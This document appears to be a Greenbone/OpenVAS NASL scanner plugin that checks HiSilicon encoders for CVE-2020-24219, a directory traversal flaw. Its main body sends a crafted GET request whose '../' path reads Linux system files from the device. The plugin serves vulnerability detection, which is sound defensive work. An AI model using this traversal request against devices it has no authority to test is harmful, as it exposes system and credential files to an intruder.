if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.112827" );
	script_version( "2021-09-24T14:04:56+0000" );
	script_tag( name: "last_modification", value: "2021-09-24 14:04:56 +0000 (Fri, 24 Sep 2021)" );
	script_tag( name: "creation_date", value: "2020-09-24 08:31:25 +0000 (Thu, 24 Sep 2020)" );
	script_tag( name: "cvss_base", value: "7.8" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:N/A:N" );
	script_tag( name: "severity_vector", value: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2020-10-19 18:15:00 +0000 (Mon, 19 Oct 2020)" );
	script_cve_id( "CVE-2020-24219" );
	script_tag( name: "qod_type", value: "exploit" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_name( "HiSilicon Encoder Directory Traversal Vulnerability" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2020 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "httpver.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "summary", value: "HiSilicon Encoders are prone to a directory traversal vulnerability in /sys/devices/media/13070000.jpgd." );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP GET request and checks the response." );
	script_tag( name: "affected", value: "HiSilicon Encoders. Other products might be vulnerable as well." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since
  the disclosure of this vulnerability. Likely none will be provided anymore. General solution options
  are to upgrade to a newer release, disable respective features, remove the product or replace the
  product by another one." );
	script_xref( name: "URL", value: "https://kojenov.com/2020-09-15-hisilicon-encoder-vulnerabilities/#arbitrary-file-disclosure-via-path-traversal-cve-2020-24219" );
	script_xref( name: "URL", value: "https://www.kb.cert.org/vuls/id/896979" );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
require("port_service_func.inc.sc");
port = http_get_port( default: 80 );
files = traversal_files( "linux" );
for pattern in keys( files ) {
	url = "/../../sys/devices/media/13070000.jpgd/" + crap( length: 3 * 4, data: "../" ) + files[pattern];
	req = http_get( port: port, item: url );
	res = http_keepalive_send_recv( port: port, data: req, bodyonly: TRUE );
	if(egrep( pattern: pattern, string: res )){
		report = "It was possible to obtain the file " + files[pattern] + " via the url " + http_report_vuln_url( port: port, url: url, url_only: TRUE ) + "\n\nResult:\n\n" + res;
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

